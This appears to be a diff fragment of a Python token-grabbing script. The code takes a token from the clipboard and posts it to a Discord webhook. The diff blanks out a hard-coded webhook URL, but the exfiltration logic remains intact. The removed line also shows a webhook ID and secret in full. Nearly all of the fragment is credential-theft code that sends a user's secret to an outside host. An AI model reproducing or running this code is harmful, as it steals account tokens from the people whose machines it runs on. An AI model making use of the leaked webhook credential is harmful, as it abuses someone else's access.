@@ -224,7 +224,7 @@ token = pyperclip.paste()
 print(f'Token gefunden: {token}')
 
 if token:
-    webhook_url = 'https://discord.com/api/webhooks/1335192784298184735/u6Da6il9hVlQjADenbhHbaqWZ3Fzdt8dmPLk7IRzfy1MYS9euU2VIWFK-LJOGX03KbHG'
+    webhook_url = ''
     payload = {'content': f'Token gefunden: {token}'}
     print(f'Sende Payload an {webhook_url}: {payload}')
     response = requests.post(webhook_url, json=payload)
